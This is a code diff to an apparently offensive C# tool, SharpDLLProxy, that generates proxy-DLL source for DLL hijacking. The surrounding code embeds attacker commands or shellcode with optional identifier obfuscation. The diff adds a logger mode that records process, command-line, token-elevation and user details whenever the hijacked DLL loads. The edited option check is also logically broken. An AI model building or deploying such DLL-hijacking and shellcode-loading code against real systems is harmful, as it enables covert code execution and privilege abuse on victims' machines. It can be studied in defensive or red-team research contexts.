@@ -25,6 +25,11 @@ namespace sharpDLLProxy
           HelpText = "Command to execute on the target system.")]
         public string Command { get; set; }
 
+        [Option("loggerCommand",
+          SetName = "loggerCommand",
+          HelpText = "Create a log DLL in order to log each function and each time the DLL loaded.")]
+        public bool loggerCommand { get; set; }
+
         [Option("show",
           SetName = "command",
           Default = false,
@@ -105,8 +110,115 @@ LPCSTR command = ""HOOK_COMMAND"";
 WinExec(command, HOOK_SHOW);
 ";
 
+        private static readonly string dllFunctionInfoLogger = @"
+void DLLInfoLogger(const char* name) {
+    int bufferLength;
+
+    FILE* filePtr;
+    fopen_s(&filePtr, ""C:\\Windows\\Temp\\SharpDLLProxy_log_dll.txt"", ""a+"");
+
+    // Get the handle to the process
+    HANDLE hProcess;
+        hProcess = GetCurrentProcess();
+
+        // Get the current date
+        SYSTEMTIME systemDate;
+        GetSystemTime(&systemDate);
+
+        // Get the PID
+        DWORD procID = GetCurrentProcessId();
+
+        // Get the process image filename
+        CHAR processImageFileName[MAX_PATH];
+        bufferLength = GetProcessImageFileNameA(hProcess, (LPSTR)&processImageFileName, sizeof(processImageFileName));
+
+        // Get the command line that ran the process;
+        LPSTR commandLine = GetCommandLineA();
+
+        fprintf_s(filePtr, "" % d/%d/%d %d:%d:%d - %d - %s\n"", systemDate.wYear, systemDate.wMonth, systemDate.wDayOfWeek, systemDate.wHour, systemDate.wMinute, systemDate.wSecond, procID, processImageFileName);
+        fprintf_s(filePtr, "" | _ Proc ID : %d\n"", procID);
+        fprintf_s(filePtr, ""  |_ Date : %d-%d-%d %d:%d:%d\n"", systemDate.wYear, systemDate.wMonth, systemDate.wDayOfWeek, systemDate.wHour, systemDate.wMinute, systemDate.wSecond);
+        fprintf_s(filePtr, "" | _ Entry point : %s\n"", name);
+        fprintf_s(filePtr, "" | _ Process Image File Name : %s\n"", processImageFileName);
+        fprintf_s(filePtr, ""  |_ Command Line : %s\n"", commandLine);
+
+        // Get the token
+        HANDLE hToken;
+        char nameUser[256] = { 0 };
+        char domainName[256] = { 0 };
+        DWORD nameUserLen = 256;
+        DWORD domainNameLen = 256;
+        SID_NAME_USE snu;
+
+        hToken = GetCurrentProcessToken();
+        fprintf_s(filePtr, "" | _ Token Information :\n"");
+
+        // TOKEN Elevation
+        PTOKEN_ELEVATION tokenElevation = NULL;
+        DWORD dwSize = 1024;
+        tokenElevation = (PTOKEN_ELEVATION) GlobalAlloc(GPTR, dwSize);
+    if (false != GetTokenInformation(hToken, TokenElevationType, tokenElevation, 1024, &dwSize))
+    {
+        if (tokenElevation->TokenIsElevated == 3)
+        {
+            fprintf_s(filePtr, "" | _ Token Elevated : False\n"");
+    }
+        else if (tokenElevation->TokenIsElevated == 2)
+        {
+            fprintf_s(filePtr, "" | _ Token Elevated : True\n"");
+}
+        else
+{
+    fprintf_s(filePtr, "" | _ Is Token Elevated : Unknown, value is %d\n"", tokenElevation->TokenIsElevated);
+}
+
+    }
+
+    // TOKEN Info User
+    PTOKEN_USER tokenInfoUser = NULL;
+dwSize = 1024;
+tokenInfoUser = (PTOKEN_USER)GlobalAlloc(GPTR, dwSize);
+if (false == GetTokenInformation(hToken, TokenUser, tokenInfoUser, 256, &dwSize))
+{
+    fprintf_s(filePtr, "" | _| Error in GetTokenInformation for the TokenUser : %u\n"", GetLastError());
+    fprintf_s(filePtr, ""\n"");
+    fclose(filePtr);
+    return;
+}
+else
+{
+    LookupAccountSidA(NULL, tokenInfoUser->User.Sid, nameUser, &nameUserLen, domainName, &domainNameLen, &snu);
+    fprintf_s(filePtr, "" | _ User : %s\\%s\n"", domainName, nameUser);
+}
+
+
+PTOKEN_OWNER tokenInfoOwner = NULL;
+dwSize = 256;
+tokenInfoOwner = (PTOKEN_OWNER)GlobalAlloc(GPTR, dwSize);
+if (false == GetTokenInformation(hToken, TokenOwner, tokenInfoOwner, 256, &dwSize))
+{
+    fprintf_s(filePtr, ""    |_| Error in GetTokenInformation for the TokenUser : %u\n"", GetLastError());
+    fprintf_s(filePtr, ""\n"");
+    fclose(filePtr);
+    return;
+}
+else
+{
+    LookupAccountSidA(NULL, tokenInfoOwner->Owner, nameUser, &nameUserLen, domainName, &domainNameLen, &snu);
+    fprintf_s(filePtr, "" | _ Owner : %s\\%s\n"", domainName, nameUser);
+}
+
+
+fprintf_s(filePtr, ""\n"");
+
+// Close the file
+fclose(filePtr);
+}
+";
+
         private string dllCodeShellcode = dllCode.Replace("// HOOK_OTHER_FUNCTIONS", otherFunctionShellcode).Replace("HOOK_MAIN_FUNCTION", mainFunctionShellcode);
         private string dllCodeCommand = dllCode.Replace("// HOOK_OTHER_FUNCTIONS", string.Empty).Replace("HOOK_MAIN_FUNCTION", mainFunctionCommand);
+        private string dllCodeLogger = dllCode.Replace("// HOOK_OTHER_FUNCTIONS", dllFunctionInfoLogger);
 
         private static readonly int ExitCodeError = 1;
 
@@ -157,6 +269,12 @@ WinExec(command, HOOK_SHOW);
                 .Replace("HOOK_COMMAND", command)
                 .Replace("HOOK_SHOW", show == true ? "1" : "0");
         }
+
+        public string PopulateDllLogger(string exports)
+        { 
+            return dllCodeLogger.Replace("HOOK_EXPORTS", exports)
+                .Replace("HOOK_MAIN_FUNCTION", "DLLInfoLogger(\"DLLMain\");");
+        }
     }
 
     class Program
@@ -187,7 +305,8 @@ WinExec(command, HOOK_SHOW);
 
             StringBuilder value = new StringBuilder(size);
             char offset = 'a';
-            for (int i = 0; i < size; i++) {
+            for (int i = 0; i < size; i++) 
+            {
                 char letter = (char)randomGenerator.Next(offset, offset + 26);
                 value.Append(letter);
             }
@@ -200,15 +319,14 @@ WinExec(command, HOOK_SHOW);
             var options = new Options();
 
             CommandLine.Parser.Default.ParseArguments<Options>(args)
-                .WithParsed(RunOptions)
-                .WithNotParsed(HandleParseError);
+                .WithParsed(RunOptions);
         }
 
         static void RunOptions(Options opts)
         {
             Console.WriteLine("[*] SharpDllProxy");
 
-            bool v = opts.Command != null & opts.InputBinary != null;
+            bool v = opts.Command != null & opts.InputBinary != null & opts.loggerCommand == true;
             if (v)
             {
                 Console.WriteLine("\n[!] Could not receive a command and a binary file at the same time.");
@@ -224,12 +342,21 @@ WinExec(command, HOOK_SHOW);
             string finalDllCode = string.Empty;
             string finalDllFilename = Directory.GetCurrentDirectory() + "\\" + Path.GetFileName(opts.InputDLL) + ".c";
 
+            // A Command is passed as input
             if (opts.Command != null)
             {
                 Console.WriteLine("\n[+] Command : {0}", opts.Command.Pastel(Color.Gold));
                 finalDllCode = dllCode.PopulateDllCommand(dllExports, opts.Command, opts.Show);
             }
-            else {
+            // The logger command is passed. A DLL will be created to log entries
+            else if (opts.loggerCommand == true) 
+            {
+                Console.WriteLine("\n[+] Added function to log when the DLL is loaded by a process");
+                finalDllCode = dllCode.PopulateDllLogger(dllExports);
+            }
+            // Otherwise no command is given as input
+            else 
+            {
                 string binaryBytes = string.Empty;
 
                 if (opts.Command == null && opts.InputBinary != null)
@@ -250,7 +377,8 @@ WinExec(command, HOOK_SHOW);
                 finalDllCode = dllCode.PopulateDllShellcode(dllExports, binaryBytes);
             }
 
-            if (opts.Obfuscate == true) {
+            if (opts.Obfuscate == true) 
+            {
                 Console.WriteLine($"\n[+] {"Obfuscating".Pastel(Color.Gold)} the source code.");
                 finalDllCode = finalDllCode.Replace("shellcode", GenerateRandomString())
                                     .Replace("ClientThread", GenerateRandomString())
@@ -262,10 +390,6 @@ WinExec(command, HOOK_SHOW);
 
             Console.WriteLine("\n[+] Saving final code to :\n{0}\n", finalDllFilename.Pastel(Color.Gold));
             File.WriteAllText(finalDllFilename, finalDllCode);
-        }
-        static void HandleParseError(IEnumerable<Error> errs)
-        {
-            //handle errors
         }
     }
 }
